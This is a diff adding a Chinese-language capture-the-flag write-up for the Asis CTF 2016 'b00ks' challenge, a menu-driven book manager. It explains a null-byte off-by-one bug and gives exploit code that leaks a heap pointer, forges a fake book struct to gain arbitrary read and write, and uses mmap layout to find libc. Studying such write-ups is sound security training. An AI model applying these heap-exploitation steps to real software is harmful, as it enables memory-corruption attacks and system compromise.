@@ -147,3 +147,239 @@ datastore: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically l
 
 ## 题目
 
+# b00ks
+
+## 介绍
+
+Asis CTF 2016的一道题目，考察点是null byte off-by-one
+
+## 题目介绍
+
+
+题目是一个常见的选单式程序，功能是一个图书管理系统。
+
+```
+1. Create a book
+2. Delete a book
+3. Edit a book
+4. Print book detail
+5. Change current author name
+6. Exit
+```
+
+程序提供了创建、删除、编辑、打印图书的功能。题目是64位程序，保护如下所示。
+
+```
+Canary                        : No
+NX                            : Yes
+PIE                           : Yes
+Fortify                       : No
+RelRO                         : Full
+```
+
+程序每创建一个book会分配0x20字节的结构来维护它的信息
+
+```
+struct book
+{
+    int id;
+    char *name;
+    char *description;
+    int size;
+}
+```
+
+
+## create
+
+book结构中存在name和description，name和description在堆上分配。首先分配name buffer，使用malloc，大小自定但小于32。
+
+```
+printf("\nEnter book name size: ", *(_QWORD *)&size);
+__isoc99_scanf("%d", &size);
+printf("Enter book name (Max 32 chars): ", &size);
+ptr = malloc(size);
+```
+
+之后分配description，同样大小自定但无限制。
+
+```
+printf("\nEnter book description size: ", *(_QWORD *)&size);
+        __isoc99_scanf("%d", &size);
+       
+v5 = malloc(size);
+```
+
+之后分配book结构的内存
+
+```
+book = malloc(0x20uLL);
+if ( book )
+{
+    *((_DWORD *)book + 6) = size;
+    *((_QWORD *)off_202010 + v2) = book;
+    *((_QWORD *)book + 2) = description;
+    *((_QWORD *)book + 1) = name;
+    *(_DWORD *)book = ++unk_202024;
+    return 0LL;
+}
+```
+
+## 漏洞
+
+程序编写的read函数存在null byte off-by-one漏洞，仔细观察这个read函数可以发现对于边界的考虑是不当的。
+
+```
+signed __int64 __fastcall my_read(_BYTE *ptr, int number)
+{
+  int i; // [rsp+14h] [rbp-Ch]
+  _BYTE *buf; // [rsp+18h] [rbp-8h]
+
+  if ( number <= 0 )
+    return 0LL;
+  buf = ptr;
+  for ( i = 0; ; ++i )
+  {
+    if ( (unsigned int)read(0, buf, 1uLL) != 1 )
+      return 1LL;
+    if ( *buf == '\n' )
+      break;
+    ++buf;
+    if ( i == number )
+      break;
+  }
+  *buf = 0;
+  return 0LL;
+}
+```
+
+## 利用
+
+### 1.泄漏
+
+
+因为程序中的my_read函数存在null byte off-by-one，事实上my_read读入的结束符'\x00'是写入到0x555555756060的位置的。这样当0x555555756060～0x555555756068写入book指针时就会覆盖掉结束符'\x00'，所以这里是存在一个地址泄漏的漏洞。通过打印author name就可以获得pointer array中第一项的值。
+
+```
+0x555555756040:	0x6161616161616161	0x6161616161616161
+0x555555756050:	0x6161616161616161	0x6161616161616161   <== author name
+0x555555756060:	0x0000555555757480 <== pointer array	0x0000000000000000
+0x555555756070:	0x0000000000000000	0x0000000000000000
+0x555555756080:	0x0000000000000000	0x0000000000000000
+```
+
+为了实现泄漏，首先在author name中需要输入32个字节来使得结束符被覆盖掉。之后我们创建book1，这个book1的指针会覆盖
+
+```
+def js(str):
+     return io.recvuntil(str)
+
+def jsn(num):
+     return io.recvn(num)
+
+def fs(str):
+     io.sendline(str)
+
+def fsn(str):
+     io.send(str)
+     
+js('Enter author name:') #input author name
+fs('a'*32)
+    
+js('>')# create book1
+fs('1')
+js('Enter book name size:')
+fs('32')
+js('Enter book name (Max 32 chars):')
+fs('object1')
+js('Enter book description size:')
+fs('32')
+js('Enter book description:')
+fs('object1')
+    
+js('>')# print book1
+fs('4')
+js('Author:')
+js('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa') # <== leak book1
+book1_addr=jsn(6)
+book1_addr=book1_addr.ljust(8,'\x00')
+book1_addr=u64(book1_addr)
+```
+
+
+### 2.off-by-one覆盖指针低字节
+
+程序中同样提供了一种change功能，change功能用于修改author name，所以通过change可以写入author name，利用off-by-one覆盖pointer array第一个项的低字节。
+
+
+覆盖掉book1指针的低字节后，这个指针会指向book1的description，由于程序提供了edit功能可以任意修改description中的内容。我们可以提前在description中布置数据伪造成一个book结构，这个book结构的description和name指针可以由直接控制。
+
+```
+def off_by_one(addr):
+    addr+=58
+    js('>')# create fake book in description
+    fs('3')
+    fake_book_data=p64(0x1)+p64(addr)+p64(addr)+pack(0xffff) 
+    js('Enter new book description:')
+    fs(fake_book_data)      # <== fake book
+    
+
+    js('>')# change author name
+    fs('5')
+    js('Enter author name:')
+    fs('a'*32)          # <== off-by-one
+```
+
+这里在description中伪造了book，使用的数据是p64(0x1)+p64(addr)+p64(addr)+pack(0xffff)。
+其中addr+58是为了使指针指向book2的指针地址，使得我们可以任意修改这些指针值。
+
+
+### 3.通过栈实现利用
+
+通过前面2部分我们已经获得了任意地址读写的能力，读者读到这里可能会觉得下面的操作是显而易见的，比如写got表劫持流程或者写__malloc_hook劫持流程等。但是这个题目特殊之处在于开启PIE并且没有泄漏libc基地址的方法，因此我们还需要想一下其他的办法。
+
+这道题的巧妙之处在于在分配第二个book时，使用一个很大的尺寸，使得堆以mmap模式进行拓展。我们知道堆有两种拓展方式一种是brk会直接拓展原来的堆，另一种是mmap会单独映射一块内存。
+
+在这里我们申请一个超大的块，来使用mmap扩展内存。因为mmap分配的内存与libc之前存在固定的偏移因此可以推算出libc的基地址。
+```
+Start              End                Offset             Perm Path
+0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/123/123
+0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/123/123
+0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/123/123
+0x00007f8d638a3000 0x00007f8d63a63000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f8d63a63000 0x00007f8d63c63000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f8d63c63000 0x00007f8d63c67000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f8d63c67000 0x00007f8d63c69000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f8d63c69000 0x00007f8d63c6d000 0x0000000000000000 rw- 
+0x00007f8d63c6d000 0x00007f8d63c93000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007f8d63e54000 0x00007f8d63e79000 0x0000000000000000 rw- <=== mmap
+0x00007f8d63e92000 0x00007f8d63e93000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007f8d63e93000 0x00007f8d63e94000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007f8d63e94000 0x00007f8d63e95000 0x0000000000000000 rw- 
+0x00007ffdc4f12000 0x00007ffdc4f33000 0x0000000000000000 rw- [stack]
+0x00007ffdc4f7a000 0x00007ffdc4f7d000 0x0000000000000000 r-- [vvar]
+0x00007ffdc4f7d000 0x00007ffdc4f7f000 0x0000000000000000 r-x [vdso]
+0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
+```
+
+```
+Start              End                Offset             Perm Path
+0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/123/123
+0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/123/123
+0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/123/123
+0x00007f6572703000 0x00007f65728c3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f65728c3000 0x00007f6572ac3000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f6572ac3000 0x00007f6572ac7000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f6572ac7000 0x00007f6572ac9000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f6572ac9000 0x00007f6572acd000 0x0000000000000000 rw- 
+0x00007f6572acd000 0x00007f6572af3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007f6572cb4000 0x00007f6572cd9000 0x0000000000000000 rw- <=== mmap
+0x00007f6572cf2000 0x00007f6572cf3000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007f6572cf3000 0x00007f6572cf4000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007f6572cf4000 0x00007f6572cf5000 0x0000000000000000 rw- 
+0x00007fffec566000 0x00007fffec587000 0x0000000000000000 rw- [stack]
+0x00007fffec59c000 0x00007fffec59f000 0x0000000000000000 r-- [vvar]
+0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso]
+0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
+```
+
